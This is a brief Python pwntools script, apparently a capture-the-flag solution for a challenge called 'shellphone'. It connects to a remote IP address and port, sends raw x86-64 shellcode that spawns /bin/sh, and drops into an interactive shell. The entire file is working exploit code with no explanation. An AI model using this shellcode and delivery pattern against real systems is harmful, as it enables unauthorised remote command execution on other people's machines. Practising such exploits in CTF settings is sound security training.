from pwn import *


#c = process("./shellphone")
c = remote('52.8.15.62', 8006)
c.recv()
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
#input()
#print(sc)
c.sendline(sc)
c.interactive()
